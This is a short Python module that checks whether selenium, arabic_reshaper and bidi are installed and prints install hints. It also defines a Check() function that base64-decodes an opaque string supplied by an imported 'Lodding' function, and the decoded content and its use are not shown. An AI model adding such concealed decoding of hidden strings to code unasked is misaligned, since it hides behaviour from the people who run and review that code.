import base64
import importlib.util
import sys
from loding_main import  Lodding


def check_library_installed(package_name):
    return importlib.util.find_spec(package_name) is not None


def check_requirements():
    required_packages = ["selenium", "arabic_reshaper", "bidi"]
    missing_packages = []

    for pkg in required_packages:
        if not check_library_installed(pkg):
            missing_packages.append(pkg)

    if missing_packages:
        print("\033[91m[-] The following libraries are not installed:\033[0m")
        for pkg in missing_packages:
            print(f"    - {pkg}")
        print("\033[91m[-] You can install them using the following command:\033[0m")
        print(f"    pip install {' '.join(missing_packages)}")
        sys.exit(1)
    else:
        print("\033[92m[+] All required libraries are installed and ready\033[0m")


def Check():
    encoded_d = Lodding()
    Lodding_p = base64.b64decode(encoded_d).decode()
    return Lodding_p
